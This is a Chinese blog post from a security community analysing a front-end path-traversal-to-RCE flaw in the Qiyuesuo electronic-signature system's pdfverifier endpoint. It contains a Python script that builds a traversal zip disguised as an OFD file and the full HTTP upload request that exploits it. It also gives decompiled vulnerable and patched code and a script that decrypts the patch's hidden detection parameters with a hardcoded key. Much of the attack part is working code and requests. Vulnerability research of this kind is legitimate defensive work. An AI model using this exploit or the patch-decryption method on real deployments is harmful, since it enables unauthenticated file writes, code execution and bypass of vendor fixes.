# 契约锁电子签章系统 pdfverifier rce 前台漏洞分析(从源码分析)-先知社区

> **来源**: https://xz.aliyun.com/news/18520  
> **文章ID**: 18520

---

# 契约锁电子签章系统 pdfverifier rce 前台漏洞分析(从源码分析)

## 前言

最近 hvv 也打了不少契约锁，正好也有源码，这次来分析一下这个漏洞的原因，环境搭建就搭建了半天，然后分析下来也还比较流程

自从实习了也好久没有分析过漏洞了，下班就想玩，正好leader 给了这个任务

## 环境搭建

![](images/20250804155757-bc2469c2-7108-1.png)

linux 环境启动 sh，windows 启动 bat 即可

![](images/20250804155758-bca7545e-7108-1.png)

然后这个终端界面是不能关闭的

之后启动成功就是访问了

不过有一个证书签名的验证，这个大家根据代码区调试分析一下绕过，毕竟商业化的东西就不分析了

注意环境搭建起来一共是有三个 web 的

<http://127.0.0.1:9181>  
这个是管理员的，本次漏洞不是在这

![](images/20250804155759-bd2853f6-7108-1.png)

是在普通用户的 9180 界面

![](images/20250804155800-bdce9d42-7108-1.png)

环境搭建好了，直接开干

## 漏洞复现

首先复现一波漏洞

首先需要制作一个可以目录穿越的 zip 文件

```
import zipfile
import os

# 输出的ZIP文件名
zip_filename = "test.ofd"

# 要写入压缩包的内容
malicious_files = {
    "..\..\..\..\..\..\..\..\..\evil.txt": "Hacked: aaaaaaaa!
",
}

# 创建ZIP文件
with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
    for file_path, content in malicious_files.items():
        zipf.writestr(file_path, content)

print(f"[+] Created malicious zip file: {zip_filename}")

```

然后我们上传

```
POST /api/pdfverifier HTTP/1.1
Host: 127.0.0.1:9180
Sec-Fetch-Site: same-origin
I18N-Language: zh_CN
Sec-Fetch-Mode: cors
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"
Referer: http://127.0.0.1:9180
X-Requested-With: XMLHttpRequest
Cookie: SID=ee80fc30-54d8-4caf-a78b-e05a523eecc3
sec-ch-ua-platform: "Windows"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydRtZWuW5kEjKt5bQ
Content-Length: 123123

------WebKitFormBoundarydRtZWuW5kEjKt5bQ
Content-Disposition: form-data; name="file"; filename="test.ofd"
Content-Type: application/ofd

{{file(F:\gj\my_create\my_tools\test.ofd)}}
------WebKitFormBoundarydRtZWuW5kEjKt5bQ--

```

YAKIT 上传文件就是方便

```
HTTP/1.1 200
Vary: accept-encoding,origin,access-control-request-headers,access-control-request-method,accept-encoding
Content-Security-Policy: script-src *  'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'  dn-staticdown.qbox.me static.geetest.com;img-src 'self' blob: data: http: *.qiyuesuo.com dn-staticdown.qbox.me static.geetest.com https: *.qiyuesuo.com ;font-src http: https: data:;
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
Content-Type: application/json
Date: Tue, 29 Jul 2025 02:55:27 GMT
Content-Length: 149

{"code":0,"statusMsg":"\u6587\u4EF6\u672A\u88AB\u4FEE\u6539","signatureInfos":[],"documentId":"","message":"\u8BF7\u6C42\u6210\u529F","statusCode":0}
```

但是我去目录看的时候并没有发现我的文件

然后就开始了一个小调试了

```
decompre:174, FileZipUtils (net.qiyuesuo.common.ofd.utils)
isOfd:95, OfdStrucUtils (net.qiyuesuo.common.ofd.utils)
verify:66, GjzwOfdVerifyHandler (net.qiyuesuo.common.ofd.verify)
doVerify:92, PdfVerifierController (com.qiyuesuo.api)
verify:54, PdfVerifierController (com.qiyuesuo.api)
invoke:-1, PdfVerifierController$$FastClassBySpringCGLIB$$f81d8fcb (com.qiyuesuo.api)
invoke:218, MethodProxy (org.springframework.cglib.proxy)
invokeJoinpoint:771, CglibAopProxy$CglibMethodInvocation (org.springframework.aop.framework)
```

发现在解压过程中出错了

![](images/20250804155802-be9f658a-7108-1.png)

突然想起来是因为权限不够，因为这个应用只能普通用户权限启动，C 盘没有权限访问，于是就只能在其他目录

所以这里只能找一个当前用户有权限的演示了

这次就没有报错了，成功穿越到了我的桌面上

![](images/20250804155802-bf098b06-7108-1.png)

至于目录穿越的后利用就很多了

看机子的系统和启动的权限，但是目前一般就是打的热加载，不过如果你遇到 windows 的机器就劝你放弃吧

## 漏洞分析+调试

首先这是一个前台漏洞，那必不可少的就是鉴权部分了，我们漏洞部分对应着  
![](images/20250804155803-bf6551fa-7108-1.png)

这个 jar包

目录结构如下

![](images/20250804155804-bfd47e40-7108-1.png)

一般鉴权逻辑猜测一个是 security，一个是 config

security 目录打开是一堆 filter，那估计是写的鉴权的实现部分了，于是去找配置部分 config

![](images/20250804155804-c03bf480-7108-1.png)

找到 PrivappConfigurer 类

```
public SecurityProperties securityProperties() {
    SecurityProperties properties = new SecurityProperties();
    String[] allowed = new String[]{"/captcha/**", "/login*", "/login/**", "/callback/**", "/company/auth/forwardinfo", "/contract/summary", "/sys/config/activemethod", "/version/info", "/version/check", "/getIosAppInfo", "/contract/ukeysign/**", "/app/url", "/contractqr/**", "/pdfverifier*", "/pdfverifier/**", "/formSignatory/image", "/formSignatory/get", "/session/status", "/user/change/mobile", "/user/mobile/pin", "/user/voice/pin", "/user/get/mobile", "/modifyphone", "/sys/custom/config", "/formSignatory/sign/v2/ukey", "/physicaluploadthird/*", "/ukey/login", "/third/ukey/login", "/sys/config/multipassword", "/multiauth", "/lk/*", "/sys/config/skin", "/contract/sweepcode/detail/*", "/contract/sweepcode/pin", "/company/logo/base64*", "/company/logo/image*", "/css", "/binary/signbyukey", "/sys/config/getbackgroundimage", "/sys/config/getbackgroundconfig", "/user/get/account", "/user/setPwdAtLogin", "/user/ukey/checkbind", "/responsibility/config", "/sys/config/icp", "/sys/config/oss", "/contract/sweepcode/pin", "/qys/webapp/basePath", "/error/outOfDate", "/company/retrieve/company/check", "/company/retrieve/user/check", "/sys/config/sign/develop/environment", "/user/retrieve/**", "/user/avatar/image", "/cert/getFromCloud", "/risk/user/**", "/idCard/*", "/company/auth/forward/overview", "/document/getOfdConfig", "/sys/config/checkEmail", "/indep/cancel/inner/all", "/physicalqr/**/**", "/msg/expire/check", "/authentication/exchangeqid*", "/pass/through/event", "/msg/expire/signsilent/company/check", "/sys/config/token/key"};
    String[] nonPreUrl = new String[]{"/qyswebapp/assets/**", "/favicon.ico", "/zhangin/js/*", "/zhangin/css/*", "/zhangin/favicon.*", "/zhangin/apk/*.apk", "/signaturethird", "/signatureupload", "/zhangin/index.html", "/zhangin/img/**", "/zhangin/fonts/**", "/zhangin/build.json", "/version/info", "/login*", "/login/**", "/qys/webapp/basePath", "/retrieve*", "/user-retrieve*", "/app/download", "/anomalous", "/error*", "/verifier*", "/privacy-protection", "/retrieve*", "/scanLogin*", "/confirm-identity", "/lpsealupload", "/signature/upload", "/face-login", "/contractqrdetail/**", "/contract-detail-open-qrcode/**", "/physicalqrdetail/**", "/WW_verify_*.txt", "/sealer/**", "/wechat/biz/callback", "/cloudhub/callback", "/dingtalk/callback", "/dingtalk/newcallback", "/dtlogin", "/logout*", "/welinklogin", "/checkHealth", "/contract/print/client/infos", "/document/print/client/download", "/contract/print/client/delete", "/app/getCurrTime.htm", "/app/console/check.htm", "/console/sealApply/view.htm", "/app/sealuse/image.htm", "/app/console/sealApply/view.htm", "/app/sys/compareVersion.htm", "/zhangin/apk/download"};
    List<String> allowedArr = (List)Arrays.stream(allowed).map((e) -> {
        return "/api" + e;
    }).collect(Collectors.toList());
    Collections.addAll(allowedArr, nonPreUrl);
    String[] allowedAll = (String[])allowedArr.toArray(new String[0]);
    properties.setAllowedPatterns(allowedAll);
    String[] noFreshSessionPatterns = new String[]{"/system/message/unreadcount"};
    properties.setNoRefreshSessionPatterns(noFreshSessionPatterns);
    properties.setSessionIdName("QID");
    return properties;
}
```

豁然开朗了

allowed 数组的我们都可以访问，毕竟里面还有个 login

而本次我们的入口点就是

![](images/20250804155805-c0941c0a-7108-1.png)

我们寻找这个路由实现的方法

这里调试分析一波流程

首先定位到路由全局搜索

![](images/20250804155806-c141733a-7108-1.png)

![](images/20250804155807-c1ccc75c-7108-1.png)

开始调试

```
public AccessResult verify(MultipartFile file) {
    try {
        byte[] pdfBytes = file.getBytes();
        String fileType = FileUtils.getExtName(file.getOriginalFilename());
        return this.doVerify(pdfBytes, fileType);
    } catch (Exception var4) {
        logger.error("验签失败：", var4);
        return AccessResult.ERROR;
    }
}
```

直接进入 doVerify

因为其他方法一眼就能看出没有什么特别的

```
private AccessResult doVerify(byte[] content, String fileType) throws Exception {
    if (!"pdf".equals(fileType) && !"ofd".equals(fileType)) {
        return AccessResult.newErrorMessage("仅支持pdf和ofd文档校验签名");
    } else if (!"ofd".equalsIgnoreCase(fileType) && PDFUtils.isEncrypted(content)) {
        return new AccessResult(ErrorCodes.DOCUMENT_ENCYPTED.getCode(), "该文件已被加密，请取消该文件加密保护再重新上传");
    } else {
        List signatureInfos;
        if ("ofd".equals(fileType)) {
            GjzwOfdVerifyHandler gjzwOfdVerifyHandler = new GjzwOfdVerifyHandler();
            OfdVerifyResponse ofdVerifyResponse = gjzwOfdVerifyHandler.verify(content);
            signatureInfos = this.ofdVerifyProcessor.ofdSignatureInfos(ofdVerifyResponse);
        } else {
            signatureInfos = VerifyProcessor.getSignatureInfos(content, new DefaultSM2VerifyClient());
        }

        boolean unmodify = true;
        String documentId = "";
        Iterator var6 = signatureInfos.iterator();

        while(var6.hasNext()) {
            SignatureInfo signatureInfo = (SignatureInfo)var6.next();
            if (signatureInfo.getCode() != 0) {
                unmodify = false;
            }

            if (net.qiyuesuo.common.lang.StringUtils.isNotBlank(signatureInfo.getDocumentId())) {
                documentId = signatureInfo.getDocumentId();
            }
        }

        AccessResult result = new AccessResult(0, "SUCCESS");
        result.put("documentId", documentId);
        result.put("signatureInfos", signatureInfos);
        if (unmodify) {
            result.put("statusCode", 0);
            result.put("statusMsg", "文件未被修改");
        } else {
            result.put("statusCode", 1);
            result.put("statusMsg", "文件已被修改");
        }

        Contract contract = this.contractService.getByDocument(net.qiyuesuo.common.lang.StringUtils.isNotBlank(documentId) ? Long.valueOf(documentId) : null);
        if (contract != null) {
            result.put("contractStatus", contract.getStatus());
        }

        return result;
    }
}
```

判断文件类型是否合法（只支持 PDF 和 OFD）  
如果是 PDF 且加密，则拒绝处理  
根据文件类型分别调用不同的签名验证处理器  
检查签名结果，判断文档是否被篡改  
提取 Document ID（文档标识）  
封装验证结果并返回

因为我们这里利用的是 ofd 文件，看到 ofd 文件的处理部分

![](images/20250804155808-c237de18-7108-1.png)

![](images/20250804155809-c2f7460c-7108-1.png)

首先得到对应的目录，下面进入 isOfd 的判断

```
public static boolean isOfd(byte[] b) {
    String ofdPath = TMP_FILE_DICTIONARY + UUID.randomUUID().toString() + ".ofd";
    String decomprePath = TMP_FILE_DICTIONARY + UUID.randomUUID().toString();

    boolean var4;
    try {
        FileUtils.writeByteArrayToFile(new File(ofdPath), b);
        File decompreFile = new File(decomprePath);
        decompreFile.mkdir();
        FileZipUtils.decompre(ofdPath, decomprePath);
        File file = new File(decomprePath);
        File[] listFiles = file.listFiles(new FileFilter() {
            public boolean accept(File pathname) {
                return pathname.getName().contains("OFD.xml");
            }
        });
        boolean var6 = listFiles != null && listFiles.length == 1;
        return var6;
    } catch (Exception var20) {
        var4 = false;
    } finally {
        try {
            FileUtils.deleteDirectory(new File(decomprePath));
        } catch (Exception var19) {
        }

        try {
            FileUtils.forceDelete(new File(ofdPath));
        } catch (Exception var18) {
        }

    }

    return var4;
}
```

代码很简洁，其实看到这里，有一个 filezip 类就大概明白了

跟进 decompre 方法

```
public static void decompre(String sourcefiles, String decompreDirectory) throws Exception {
ZipFile readfile = null;

try {
    readfile = new ZipFile(sourcefiles, Charset.forName("UTF-8"));
    Enumeration<? extends ZipEntry> takeentrie = readfile.entries();
    ZipEntry zipEntry = null;

    while(takeentrie.hasMoreElements()) {
        zipEntry = (ZipEntry)takeentrie.nextElement();
        String entryName = zipEntry.getName();
        InputStream in = null;
        FileOutputStream out = null;

        try {
            File unpackfile;
            if (zipEntry.isDirectory()) {
                String name = zipEntry.getName();
                name = name.substring(0, name.length() - 1);
                unpackfile = new File(decompreDirectory + File.separator + name);
                unpackfile.mkdirs();
            } else {
                int index = entryName.lastIndexOf("\");
                if (index != -1) {
                    unpackfile = new File(decompreDirectory + File.separator + entryName.substring(0, index));
                    unpackfile.mkdirs();
                }

                index = entryName.lastIndexOf("/");
                if (index != -1) {
                    unpackfile = new File(decompreDirectory + File.separator + entryName.substring(0, index));
                    unpackfile.mkdirs();
                }

                unpackfile = new File(decompreDirectory + File.separator + zipEntry.getName());
                in = readfile.getInputStream(zipEntry);
                out = new FileOutputStream(unpackfile);
                byte[] by = new byte[1024];

                int c;
                while((c = in.read(by)) != -1) {
                    out.write(by, 0, c);
                }

                out.flush();
            }
        } catch (Exception var27) {
            logger.error(var27.getMessage());
            throw var27;
        } finally {
            IOUtils.closeQuietly(new Closeable[]{out, in});
        }
    }
} catch (Exception var29) {
    logger.error(var29.getMessage());
    throw var29;
} finally {
    if (readfile != null) {
        try {
            readfile.close();
        } catch (Exception var26) {
            logger.error(var26.getMessage(), var26);
            throw var26;
        }
    }

}

```

![](images/20250804155810-c37c4af0-7108-1.png)

首先解析我们的 zip 文件

![](images/20250804155811-c41486a8-7108-1.png)

我们解压的路径

![](images/20250804155812-c4bb70f8-7108-1.png)

然后读取字节并写入我们的指定文件

可以看到整个过程完全没有过滤目录穿越，导致了我们漏洞产生

## 漏洞修复+破解密文包

下载最新的补丁，也没有多少个源码

<https://www.qiyuesuo.com/more/security/servicepack>

一下就能定位到 PdfverifierPreventWrapper

```
public Collection<Part> getParts() throws ServletException, IOException {
Collection<Part> parts = super.getParts();
String url = QiyuesuoURIStringUtils.uriProcessor((HttpServletRequest)super.getRequest());
List<Part> newParts = new ArrayList();
Iterator var4 = parts.iterator();

while(true) {
    while(true) {
        while(var4.hasNext()) {
            Part part = (Part)var4.next();
            String headerValue = part.getHeader("Content-Disposition");
            ContentDisposition disposition = ContentDisposition.parse(headerValue);
            String filename = disposition.getFilename();
            if (filename != null) {
                if (filename.startsWith("=?") && filename.endsWith("?=")) {
                    filename = PdfverifierPreventWrapper.MimeDelegate.decode(filename);
                }

                String fileType = FileUtils.getExtName(filename);
                if ("pdf".equalsIgnoreCase(fileType) && !QiyuesuoURIStringUtils.ListHaveStr(SENSITIVE_URL, url)) {
                    newParts.add(part);
                } else {
                    try {
                        InputStream in = part.getInputStream();
                        Throwable var11 = null;

                        try {
                            byte[] ofdBytes = IOUtils.toByteArray(in);
                            if (this.hasPathTraversal(ofdBytes)) {
                                logger.warn("检测到穿越符！文件名称为{}", filename);
                            } else {
                                newParts.add(part);
                            }
                        } catch (Throwable var21) {
                            var11 = var21;
                            throw var21;
                        } finally {
                            if (in != null) {
                                if (var11 != null) {
                                    try {
                                        in.close();
                                    } catch (Throwable var20) {
                                        var11.addSuppressed(var20);
                                    }
                                } else {
                                    in.close();
                                }
                            }

                        }
                    } catch (IOException var23) {
                        logger.error("解析流失败！", var23);
                    }
                }
            } else {
                newParts.add(part);
            }
        }

        return newParts;
    }
}
```

可以看到会检测我们文件名的目录穿越了

```
private boolean hasPathTraversal(byte[] ofdBytes) throws IOException {
    String ofdPath = UUID.randomUUID() + ".ofd";
    ZipFile readfile = null;

    try {
        org.apache.commons.io.FileUtils.writeByteArrayToFile(new File(ofdPath), ofdBytes);
        readfile = new ZipFile(ofdPath, Charset.forName("UTF-8"));
        Enumeration<? extends ZipEntry> takeentrie = readfile.entries();
        ZipEntry zipEntry = null;

        while(takeentrie.hasMoreElements()) {
            zipEntry = (ZipEntry)takeentrie.nextElement();
            String entryName = zipEntry.getName();
            if (StringUtils.isNotBlank(entryName) && entryName.contains(PARAM)) {
                logger.warn("检测到文件名称异常！完整名称为：{}", entryName);
                boolean var23 = true;
                return var23;
            }

            Iterator var7 = SENSITIVE_KEY_LISTS.iterator();

            while(var7.hasNext()) {
                String key = (String)var7.next();
                if (entryName.toLowerCase().endsWith(key)) {
                    logger.warn("检测到文件名称异常！文件名称为{}", entryName);
                    boolean var9 = true;
                    return var9;
                }
            }
        }

        return false;
    } catch (Throwable var21) {
        return false;
    } finally {
        if (readfile != null) {
            readfile.close();
        }

        try {
            org.apache.commons.io.FileUtils.forceDelete(new File(ofdPath));
        } catch (Exception var20) {
        }

    }
}
```

但是我找半天，都没有发现 PARAM 的取值

```
private static final String PARAM = SecurityResourceOperator.getStringWithKey("PdfverifierPreventWrapper.PARAM");
```

把代码都翻了一遍，就一个  
security.rsc  
文件很可疑，全是密文

![](images/20250804155813-c571a7f6-7108-1.png)

全局搜索一下这个文件名称的处理

![](images/20250804155814-c6061ea4-7108-1.png)

有一个读取，估计解密方法就在其中了

从指定的 Jar 包内读取一个资源文件（rsc），逐行解析每行“key:value”格式的数据，使用 RSA 私钥解密 key 和 value（value 可能是多个逗号分隔的密文），然后将解密后的 key 和对应的多个解密后的 value 列表存入全局的 SECURITY\_SRC\_MAP 映射，最后打印所有解密后的键值对。

```
public static void readRsc(JarFile jarFile, ZipEntry zipentry) {
    try {
        InputStream inputStream = jarFile.getInputStream(zipentry);
        Throwable var3 = null;

        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
            Throwable var5 = null;

            try {
                while(true) {
                    String[] parts;
                    String value;
                    do {
                        String line;
                        if ((line = reader.readLine()) == null) {
                            Iterator var45 = SECURITY_SRC_MAP.entrySet().iterator();

                            while(var45.hasNext()) {
                                Map.Entry<String, List<String>> entry = (Map.Entry)var45.next();
                                value = (String)entry.getKey();
                                List<String> valueList = (List)entry.getValue();
                                logger.debug("Key: {}", value);
                                logger.debug("Value: {}", valueList);
                            }

                            return;
                        }

                        parts = line.split(":", 2);
                    } while(parts.length != 2);

                    String key = parts[0].trim();
                    value = parts[1].trim();
                    List<String> decodedValueList = new ArrayList();
                    String[] encodedValueList = value.split(",");
                    String[] var12 = encodedValueList;
                    int var13 = encodedValueList.length;

                    for(int var14 = 0; var14 < var13; ++var14) {
                        String encodeValue = var12[var14];
                        String decodeValue = RSAUtils.decryptByDefaultPrivateKey(encodeValue);
                        decodedValueList.add(decodeValue.trim());
                    }

                    String decodedKey = RSAUtils.decryptByDefaultPrivateKey(key);
                    SECURITY_SRC_MAP.put(decodedKey, decodedValueList);
                }
            } catch (Throwable var40) {
                var5 = var40;
                throw var40;
            } finally {
                if (reader != null) {
                    if (var5 != null) {
                        try {
                            reader.close();
                        } catch (Throwable var39) {
                            var5.addSuppressed(var39);
                        }
                    } else {
                        reader.close();
                    }
                }

            }
        } catch (Throwable var42) {
            var3 = var42;
            throw var42;
        } finally {
            if (inputStream != null) {
                if (var3 != null) {
                    try {
                        inputStream.close();
                    } catch (Throwable var38) {
                        var3.addSuppressed(var38);
                    }
                } else {
                    inputStream.close();
                }
            }

        }
    } catch (Exception var44) {
        logger.error("加载rsc失败！", var44);
    }
}
```

密钥是关键，而且这个密钥是写死在代码中的

跟进 decryptByDefaultPrivateKey

```
public static String decryptByDefaultPrivateKey(String ciphertext) {
try {
    if (ciphertext.startsWith("{cipher}")) {
        ciphertext = ciphertext.substring("{cipher}".length());
    }

    return decryptByPrivateKey(ciphertext, "xxxxxxxxxxxxxxxxxxxxxxxxxxx");
} catch (Exception var2) {
    logger.error("密码解密出错", var2);
    return null;
}
```

xxx 就是密钥

然后写一个脚本解密

```
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import base64

private_key_b64 = """
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
""".replace("
", "").strip()

pem_key = "-----BEGIN PRIVATE KEY-----
"
pem_key += "
".join([private_key_b64[i:i+64] for i in range(0, len(private_key_b64), 64)])
pem_key += "
-----END PRIVATE KEY-----
"

private_key = RSA.import_key(pem_key)

def decrypt(ciphertext_b64):
    ciphertext = base64.b64decode(ciphertext_b64)
    cipher = PKCS1_v1_5.new(private_key)
    sentinel = None
    decrypted = cipher.decrypt(ciphertext, sentinel)
    return decrypted.decode('utf-8')

# 读取你的资源文件，逐行解密示例
resource_file_path = r'F:\qiyuesuo.package.el7.4.3.4.20230203\security.rsc'

with open(resource_file_path, 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if not line or ':' not in line:
            continue
        key_enc, value_enc = line.split(':', 1)
        if key_enc.startswith('{cipher}'):
            key_enc = key_enc[len('{cipher}'):]
        key_dec = decrypt(key_enc)

        values_dec = []
        for val in value_enc.split(','):
            val = val.strip()
            if val.startswith('{cipher}'):
                val = val[len('{cipher}'):]
            val_dec = decrypt(val)
            values_dec.append(val_dec)

        print(f"Key: {key_dec}")
        print(f"Values: {values_dec}")

```

得到我们的明文

![](images/20250804155815-c66af64c-7108-1.png)

完美
